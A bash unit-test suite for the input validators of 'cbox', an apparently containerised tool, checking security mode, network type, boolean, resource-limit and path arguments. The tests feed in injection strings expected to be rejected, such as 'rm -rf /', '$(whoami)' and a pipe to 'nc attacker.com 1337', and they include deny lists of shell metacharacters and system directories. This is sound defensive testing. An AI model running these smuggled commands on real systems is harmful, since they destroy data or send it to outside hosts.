#!/usr/bin/env bash
# Comprehensive unit tests for cbox security input validation
# Tests validation functions independently without Docker execution

set -euo pipefail

# Test configuration
TEST_FILE="$(basename "${BASH_SOURCE[0]}")"
TEST_DIR="$(dirname "${BASH_SOURCE[0]}")"
WORK_DIR="$(dirname "$TEST_DIR")"

echo "Unit Test Suite: Input Validation"
echo "================================="
echo "Test file: $TEST_FILE"
echo "Working directory: $WORK_DIR"
echo ""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Test counters
TESTS_RUN=0
TESTS_PASSED=0
TESTS_FAILED=0

# Extract validation functions from cbox for isolated testing
create_validation_functions() {
    cat > /tmp/cbox_validation_functions.sh << 'EOF'
#!/usr/bin/env bash

# Validate security mode argument
validate_security_mode() {
  local mode="$1"
  
  # Only allow specific security modes to prevent injection
  case "$mode" in
    standard|restricted|paranoid)
      return 0
      ;;
    *)
      echo "cbox: Invalid security mode: $mode" >&2
      echo "  Valid modes: standard, restricted, paranoid" >&2
      return 1
      ;;
  esac
}

# Validate network type argument  
validate_network_type() {
  local network="$1"
  
  # Only allow specific network types to prevent injection
  case "$network" in
    host|bridge|none)
      return 0
      ;;
    *)
      echo "cbox: Invalid network type: $network" >&2
      echo "  Valid types: host, bridge, none" >&2
      return 1
      ;;
  esac
}

# Validate boolean argument (for SSH agent)
validate_boolean() {
  local value="$1"
  local arg_name="$2"
  
  case "$value" in
    true|false)
      return 0
      ;;
    *)
      echo "cbox: Invalid boolean value for $arg_name: $value" >&2
      echo "  Valid values: true, false" >&2
      return 1
      ;;
  esac
}

# Validate resource limits
validate_resource_limits() {
  local memory_limit="${1:-4g}"
  local cpu_limit="${2:-2}"
  
  # Validate memory limit format
  if ! [[ "$memory_limit" =~ ^[0-9]+[kmgtKMGT]?$ ]]; then
    echo "cbox: Invalid memory limit format: $memory_limit" >&2
    echo "  Use format like: 1g, 512m, 2048k, or plain number (bytes)" >&2
    return 1
  fi
  
  # Validate CPU limit format  
  if ! [[ "$cpu_limit" =~ ^[0-9]+(\.[0-9]+)?$ ]]; then
    echo "cbox: Invalid CPU limit format: $cpu_limit" >&2
    echo "  Use format like: 1, 2, 0.5, 1.5" >&2
    return 1
  fi
  
  return 0
}

# Path security validation (simplified for testing)
validate_path_security() {
  local path="$1"
  
  # Check for shell metacharacters that could lead to command injection
  if [[ "$path" == *";"* ]] || [[ "$path" == *"|"* ]] || [[ "$path" == *"&"* ]] || \
     [[ "$path" == *">"* ]] || [[ "$path" == *"<"* ]] || [[ "$path" == *'$('* ]] || \
     [[ "$path" == *'${'* ]] || [[ "$path" == *'`'* ]]; then
    echo "cbox: Security error: Path contains dangerous shell characters" >&2
    echo "  Characters like ; | & > < $ and backticks are not allowed" >&2
    return 1
  fi
  
  # Check for null bytes (common in path traversal attacks)
  local null_count
  null_count=$(printf '%s' "$path" | od -An -N1000 -tx1 2>/dev/null | grep -o '00' | wc -l 2>/dev/null | tr -d ' \n' || echo 0)
  if [[ "$null_count" -gt 0 ]]; then
    echo "cbox: Security error: Path contains null bytes" >&2
    return 1
  fi
  
  # Block access to system directories
  case "$path" in
    /etc|/etc/*)
      echo "cbox: Security error: Access to system directory denied: $path" >&2
      return 1
      ;;
    /sys|/sys/*|/proc|/proc/*|/dev|/dev/*|/boot|/boot/*|/root|/root/*)
      echo "cbox: Security error: Access to system directory denied: $path" >&2
      return 1
      ;;
    /bin|/bin/*|/sbin|/sbin/*|/lib|/lib/*|/lib64|/lib64/*)
      echo "cbox: Security error: Access to system directory denied: $path" >&2
      return 1
      ;;
  esac
  
  return 0
}
EOF
}

# Test execution framework
run_test() {
    local test_name="$1"
    local test_function="$2"
    local expected_result="${3:-success}"
    
    TESTS_RUN=$((TESTS_RUN + 1))
    
    echo -n "[$TESTS_RUN] Testing: $test_name ... "
    
    # Run test function in subshell to isolate environment
    local result
    if result=$(eval "$test_function" 2>&1); then
        if [[ "$expected_result" == "success" ]]; then
            echo -e "${GREEN}PASSED${NC}"
            TESTS_PASSED=$((TESTS_PASSED + 1))
            return 0
        else
            echo -e "${RED}FAILED${NC} (expected failure but got success)"
            echo "  Output: $result" | head -3
            TESTS_FAILED=$((TESTS_FAILED + 1))
            return 1
        fi
    else
        if [[ "$expected_result" == "failure" ]]; then
            echo -e "${GREEN}PASSED${NC} (expected failure)"
            TESTS_PASSED=$((TESTS_PASSED + 1))
            return 0
        else
            echo -e "${RED}FAILED${NC}"
            echo "  Output: $result" | head -3
            TESTS_FAILED=$((TESTS_FAILED + 1))
            return 1
        fi
    fi
}

# Test security mode validation
test_security_mode_validation() {
    echo -e "${BLUE}1. Security Mode Validation Tests${NC}"
    echo "-----------------------------------"
    
    # Valid modes
    run_test "Accepts 'standard' mode" \
        "validate_security_mode standard" \
        "success"
    
    run_test "Accepts 'restricted' mode" \
        "validate_security_mode restricted" \
        "success"
    
    run_test "Accepts 'paranoid' mode" \
        "validate_security_mode paranoid" \
        "success"
    
    # Invalid modes
    run_test "Rejects 'invalid' mode" \
        "validate_security_mode invalid" \
        "failure"
    
    run_test "Rejects 'STANDARD' (case sensitive)" \
        "validate_security_mode STANDARD" \
        "failure"
    
    run_test "Rejects empty string" \
        "validate_security_mode ''" \
        "failure"
    
    run_test "Rejects numeric input" \
        "validate_security_mode 123" \
        "failure"
    
    # Injection attempts
    run_test "Rejects command injection in mode" \
        "validate_security_mode 'standard; rm -rf /'" \
        "failure"
    
    run_test "Rejects shell substitution in mode" \
        "validate_security_mode 'standard\$(whoami)'" \
        "failure"
    
    run_test "Rejects backtick injection in mode" \
        "validate_security_mode 'standard\`id\`'" \
        "failure"
    
    echo ""
}

# Test network type validation
test_network_type_validation() {
    echo -e "${BLUE}2. Network Type Validation Tests${NC}"
    echo "--------------------------------"
    
    # Valid network types
    run_test "Accepts 'host' network" \
        "validate_network_type host" \
        "success"
    
    run_test "Accepts 'bridge' network" \
        "validate_network_type bridge" \
        "success"
    
    run_test "Accepts 'none' network" \
        "validate_network_type none" \
        "success"
    
    # Invalid network types
    run_test "Rejects 'container' network" \
        "validate_network_type container" \
        "failure"
    
    run_test "Rejects 'overlay' network" \
        "validate_network_type overlay" \
        "failure"
    
    run_test "Rejects 'HOST' (case sensitive)" \
        "validate_network_type HOST" \
        "failure"
    
    run_test "Rejects empty string" \
        "validate_network_type ''" \
        "failure"
    
    # Injection attempts
    run_test "Rejects command injection in network" \
        "validate_network_type 'host && echo pwned'" \
        "failure"
    
    run_test "Rejects pipe injection in network" \
        "validate_network_type 'host | nc attacker.com 1337'" \
        "failure"
    
    echo ""
}

# Test boolean validation
test_boolean_validation() {
    echo -e "${BLUE}3. Boolean Value Validation Tests${NC}"
    echo "-------------------------------"
    
    # Valid boolean values
    run_test "Accepts 'true'" \
        "validate_boolean true --test-arg" \
        "success"
    
    run_test "Accepts 'false'" \
        "validate_boolean false --test-arg" \
        "success"
    
    # Invalid boolean values
    run_test "Rejects 'yes'" \
        "validate_boolean yes --test-arg" \
        "failure"
    
    run_test "Rejects 'no'" \
        "validate_boolean no --test-arg" \
        "failure"
    
    run_test "Rejects '1'" \
        "validate_boolean 1 --test-arg" \
        "failure"
    
    run_test "Rejects '0'" \
        "validate_boolean 0 --test-arg" \
        "failure"
    
    run_test "Rejects 'TRUE' (case sensitive)" \
        "validate_boolean TRUE --test-arg" \
        "failure"
    
    run_test "Rejects empty string" \
        "validate_boolean '' --test-arg" \
        "failure"
    
    # Injection attempts
    run_test "Rejects command injection in boolean" \
        "validate_boolean 'true; echo hacked' --test-arg" \
        "failure"
    
    echo ""
}

# Test resource limit validation
test_resource_limit_validation() {
    echo -e "${BLUE}4. Resource Limit Validation Tests${NC}"
    echo "--------------------------------"
    
    # Valid memory formats
    run_test "Accepts plain number for memory (bytes)" \
        "validate_resource_limits 1073741824 2" \
        "success"
    
    run_test "Accepts 'k' suffix for memory" \
        "validate_resource_limits 512k 2" \
        "success"
    
    run_test "Accepts 'm' suffix for memory" \
        "validate_resource_limits 512m 2" \
        "success"
    
    run_test "Accepts 'g' suffix for memory" \
        "validate_resource_limits 4g 2" \
        "success"
    
    run_test "Accepts 'G' suffix for memory" \
        "validate_resource_limits 4G 2" \
        "success"
    
    # Valid CPU formats
    run_test "Accepts integer CPU limit" \
        "validate_resource_limits 4g 2" \
        "success"
    
    run_test "Accepts decimal CPU limit" \
        "validate_resource_limits 4g 1.5" \
        "success"
    
    # Invalid formats
    run_test "Rejects invalid memory format" \
        "validate_resource_limits 'invalid' 2" \
        "failure"
    
    run_test "Rejects memory with space" \
        "validate_resource_limits '4 g' 2" \
        "failure"
    
    run_test "Rejects invalid CPU format" \
        "validate_resource_limits 4g 'invalid'" \
        "failure"
    
    run_test "Rejects CPU with multiple decimals" \
        "validate_resource_limits 4g 1.5.2" \
        "failure"
    
    echo ""
}

# Test path security validation
test_path_security_validation() {
    echo -e "${BLUE}5. Path Security Validation Tests${NC}"
    echo "-------------------------------"
    
    # Valid paths
    run_test "Accepts normal path" \
        "validate_path_security '/home/user/project'" \
        "success"
    
    run_test "Accepts current directory" \
        "validate_path_security '.'" \
        "success"
    
    run_test "Accepts relative path" \
        "validate_path_security './project'" \
        "success"
    
    run_test "Accepts path with spaces" \
        "validate_path_security '/home/user/my project'" \
        "success"
    
    # Dangerous shell characters
    run_test "Rejects path with semicolon" \
        "validate_path_security '/home/user; rm -rf /'" \
        "failure"
    
    run_test "Rejects path with pipe" \
        "validate_path_security '/home/user | nc attacker.com 1337'" \
        "failure"
    
    run_test "Rejects path with ampersand" \
        "validate_path_security '/home/user && malicious_command'" \
        "failure"
    
    run_test "Rejects path with redirect" \
        "validate_path_security '/home/user > /etc/passwd'" \
        "failure"
    
    run_test "Rejects path with command substitution" \
        "validate_path_security '/home/user/\$(whoami)'" \
        "failure"
    
    run_test "Rejects path with variable expansion" \
        "validate_path_security '/home/user/\${PATH}'" \
        "failure"
    
    run_test "Rejects path with backticks" \
        "validate_path_security '/home/user/\`id\`'" \
        "failure"
    
    # System directory protection
    run_test "Rejects /etc directory" \
        "validate_path_security '/etc'" \
        "failure"
    
    run_test "Rejects /etc subdirectory" \
        "validate_path_security '/etc/passwd'" \
        "failure"
    
    run_test "Rejects /bin directory" \
        "validate_path_security '/bin'" \
        "failure"
    
    run_test "Rejects /sys directory" \
        "validate_path_security '/sys/kernel'" \
        "failure"
    
    run_test "Rejects /proc directory" \
        "validate_path_security '/proc/version'" \
        "failure"
    
    run_test "Rejects /root directory" \
        "validate_path_security '/root/.ssh'" \
        "failure"
    
    echo ""
}

# Test edge cases and boundary conditions
test_edge_cases() {
    echo -e "${BLUE}6. Edge Cases and Boundary Conditions${NC}"
    echo "-----------------------------------"
    
    # Empty and whitespace inputs
    run_test "Handles empty security mode gracefully" \
        "validate_security_mode" \
        "failure"
    
    run_test "Handles whitespace-only security mode" \
        "validate_security_mode '   '" \
        "failure"
    
    run_test "Handles tab characters in network type" \
        "validate_network_type $'\t'host$'\t'" \
        "failure"
    
    # Unicode and special characters
    run_test "Rejects Unicode characters in security mode" \
        "validate_security_mode 'standard™'" \
        "failure"
    
    run_test "Rejects null bytes in path (hex 00)" \
        "validate_path_security $'/home/user\x00/project'" \
        "failure"
    
    # Very long inputs
    run_test "Handles very long security mode name" \
        "validate_security_mode '$(printf 'a%.0s' {1..1000})'" \
        "failure"
    
    echo ""
}

# Main execution
main() {
    echo "Setting up test environment..."
    create_validation_functions
    source /tmp/cbox_validation_functions.sh
    echo ""
    
    # Run all test suites
    test_security_mode_validation
    test_network_type_validation
    test_boolean_validation
    test_resource_limit_validation
    test_path_security_validation
    test_edge_cases
    
    # Print results
    echo "==========================================="
    echo -e "${BLUE}Unit Test Results Summary:${NC}"
    echo "  Tests run: $TESTS_RUN"
    echo -e "  Tests passed: ${GREEN}$TESTS_PASSED${NC}"
    echo -e "  Tests failed: ${RED}$TESTS_FAILED${NC}"
    
    if [[ $TESTS_FAILED -eq 0 ]]; then
        echo -e "  Result: ${GREEN}ALL TESTS PASSED${NC}"
        echo ""
        echo -e "${GREEN}✓ Input validation is working correctly${NC}"
        echo -e "${GREEN}✓ Security protections are in place${NC}"
        echo -e "${GREEN}✓ Command injection prevention is effective${NC}"
    else
        echo -e "  Result: ${RED}SOME TESTS FAILED${NC}"
        echo ""
        echo -e "${RED}✗ Input validation has issues that need attention${NC}"
    fi
    
    echo ""
    
    # Cleanup
    rm -f /tmp/cbox_validation_functions.sh
    
    # Exit with appropriate code
    [[ $TESTS_FAILED -eq 0 ]] && exit 0 || exit 1
}

# Run main function
main "$@"